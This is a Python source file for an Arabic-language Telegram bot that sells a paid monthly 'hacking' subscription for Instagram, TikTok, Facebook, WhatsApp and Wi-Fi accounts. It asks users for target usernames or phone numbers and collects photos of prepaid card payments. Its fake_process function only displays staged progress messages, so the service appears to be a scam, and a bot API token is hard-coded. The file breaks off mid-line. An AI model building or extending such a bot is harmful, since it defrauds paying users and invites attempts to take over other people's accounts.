import telebot
from telebot import types
from flask import Flask, request
import json
import os
import logging
import time
import datetime

# ✅ تفعيل الطباعة للتشخيص على Railway
logging.basicConfig(level=logging.INFO)

API_TOKEN = "7684563087:AAEO4rd2t7X3v8CsZMdfzOc9s9otm9OGxfw"
ADMIN_ID = 7758666677
CHANNEL_USERNAME = "@MARK01i"
bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
DATA_FILE = "data.json"
USERS_FILE = "users.json"
SUBSCRIPTION_FILE = "subscriptions.json"

default_data = {
    "buttons": [
        {"label": "🔓 اختراق إنستقرام", "prompt": "📩 أرسل يوزر أو رابط الحساب المستهدف:"},
        {"label": "🎯 اختراق تيك توك", "prompt": "📩 أرسل رابط أو يوزر تيك توك:"},
        {"label": "📘 اختراق فيسبوك", "prompt": "📩 أرسل رابط الحساب أو رقم الهاتف:"},
        {"label": "📶 اختراق Wi-Fi", "prompt": ""},
        {"label": "👾 اختراق واتساب", "prompt": "📩 أرسل رقم الهاتف مع مفتاح الدولة:"}
    ]
}

if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, "w") as f:
        json.dump(default_data, f)

def load_data():
    with open(DATA_FILE, "r") as f:
        return json.load(f)

def save_data(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    with open(USERS_FILE, "r") as f:
        return json.load(f)

def save_users(data):
    with open(USERS_FILE, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def load_subscriptions():
    if not os.path.exists(SUBSCRIPTION_FILE):
        return {}
    with open(SUBSCRIPTION_FILE, "r") as f:
        return json.load(f)

def save_subscriptions(data):
    with open(SUBSCRIPTION_FILE, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

def is_subscribed(user_id):
    subs = load_subscriptions()
    if str(user_id) in subs:
        expiry_str = subs[str(user_id)]
        expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d")
        if expiry_date >= datetime.datetime.now():
            return True
    return False

@bot.message_handler(commands=["start"])
def start(message):
    user = message.from_user
    users = load_users()
    users[str(user.id)] = user.username or ""
    save_users(users)

    if not is_subscribed(user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("قناة الاشتراك 📢", url="https://t.me/MARK01i"))
        bot.send_message(user.id, "✋ لاستخدام البوت عليك الاشتراك بسعر 30 آسيا شهريًا.\n"
                                  "📥 بعد الدفع، أرسل صورة بطاقة الرصيد هنا.\n"
                                  "👤 المالك: @M_A_R_K75", reply_markup=markup)
        return

    data = load_data()
    bot.send_message(ADMIN_ID, f"👤 مستخدم جديد\nيوزر: @{user.username or 'غير متوفر'}\nID: {user.id}")
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for btn in data["buttons"]:
        markup.add(btn["label"])
    if str(user.id) == str(ADMIN_ID):
        markup.add("⚙️ الأدمن")
    bot.send_message(user.id, "🧠 مرحبًا بك في بوت الاختراق الذكي!\nاختر أحد الأزرار:", reply_markup=markup)

@bot.message_handler(content_types=['photo'])
def photo_handler(message):
    user = message.from_user
    if not is_subscribed(user.id):
        file_id = message.photo[-1].file_id
        caption = f"📥 صورة دفع من المستخدم:\nيوزر: @{user.username or 'غير متوفر'}\nID: {user.id}"
        bot.send_photo(ADMIN_ID, file_id, caption=caption)
        bot.send_message(user.id, "✅ تم إرسال صورة الدفع للمالك. انتظر التفعيل.")
    else:
        bot.send_message(user.id, "🔔 أنت مشترك بالفعل، يمكنك استخدام البوت.")

@bot.message_handler(commands=['done'])
def done_command(message):
    if str(message.from_user.id) != str(ADMIN_ID):
        return
    try:
        username = message.text.split()[1].lstrip('@')
    except IndexError:
        bot.send_message(message.chat.id, "❌ استخدم الصيغة: /done username")
        return

    users = load_users()
    user_id = None
    for uid, uname in users.items():
        if uname.lower() == username.lower():
            user_id = uid
            break

    if user_id is None:
        bot.send_message(message.chat.id, f"❌ لم أجد المستخدم @{username}")
        return

    subs = load_subscriptions()
    expiry_date = datetime.datetime.now() + datetime.timedelta(days=30)
    subs[user_id] = expiry_date.strftime("%Y-%m-%d")
    save_subscriptions(subs)

    bot.send_message(message.chat.id, f"✅ تم تفعيل الاشتراك للمستخدم @{username}")
    bot.send_message(user_id, "🎉 تم تفعيل اشتراكك، يمكنك الآن استخدام البوت.")

@bot.message_handler(commands=["list_buttons"])
def list_buttons(message):
    if str(message.from_user.id) != str(ADMIN_ID): return
    data = load_data()
    text = "📋 الأزرار الحالية:\n"
    for i, btn in enumerate(data["buttons"], 1):
        text += f"{i}. {btn['label']}\n"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=["add_button"])
def add_button(message):
    if str(message.from_user.id) != str(ADMIN_ID): return
    msg = bot.send_message(message.chat.id, "📝 أرسل اسم الزر الجديد:")
    bot.register_next_step_handler(msg, get_button_label)

def get_button_label(message):
    label = message.text
    msg = bot.send_message(message.chat.id, "📝 أرسل الرسالة التفاعلية عند الضغط:")
    bot.register_next_step_handler(msg, lambda m: save_new_button(label, m))

def save_new_button(label, message):
    prompt = message.text
    data = load_data()
    data["buttons"].append({"label": label, "prompt": prompt})
    save_data(data)
    bot.send_message(message.chat.id, f"✅ تم إضافة الزر: {label}")

@bot.message_handler(commands=["remove_button"])
def remove_button(message):
    if str(message.from_user.id) != str(ADMIN_ID): return
    data = load_data()
    markup = types.InlineKeyboardMarkup()
    for btn in data["buttons"]:
        markup.add(types.InlineKeyboardButton(btn["label"], callback_data="delbtn_" + btn["label"]))
    bot.send_message(message.chat.id, "🗑️ اختر الزر الذي تريد حذفه:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("delbtn_"))
def delete_button(call):
    if str(call.from_user.id) != str(ADMIN_ID): return
    label = call.data.replace("delbtn_", "")
    data = load_data()
    data["buttons"] = [b for b in data["buttons"] if b["label"] != label]
    save_data(data)
    bot.edit_message_text(f"✅ تم حذف الزر: {label}", call.message.chat.id, call.message.message_id)

@bot.message_handler(func=lambda m: m.text == "⚙️ الأدمن" and str(m.from_user.id) == str(ADMIN_ID))
def admin_panel(message):
    bot.send_message(message.chat.id, "🛠️ لوحة تحكم الأدمن:\n/list_buttons - عرض الأزرار\n/add_button - إضافة زر\n/remove_button - حذف زر")

@bot.message_handler(func=lambda m: True)
def handle_buttons(message):
    data = load_data()
    for btn in data["buttons"]:
        if message.text == btn["label"]:
            if btn["prompt"]:
                bot.send_message(message.chat.id, btn["prompt"])
                bot.register_next_step_handler(message, lambda m: fake_process(m, btn["label"]))
            else:
                fake_process(message, btn["label"])
            return

def fake_process(message, label):
    chat_id = message.chat.id

    loading_msgs = [
        "🔍 جاري تحليل الهدف...",
        "📡 الاتصال بالخوادم...",
        "🧠 تفعيل الذكاء الاصطناعي...",
        "🔓 فك التشفير...",
        "📂 استخراج البيانات...",
    ]

    sent_msg = bot.send_message(chat_id, loading_msgs[0])
    time.sleep(2)

    progress_stages = [10, 25, 40, 55, 70, 85, 100]
    for percent in progress_stages:
        try:
            bot.edit_message_text(f"🔄 جاري الاختراق... {percent}% 🔄", chat_id, sent_msg.message_id)
        except Exception:
            pass
        time.sleep(1.5)

    for msg in loading
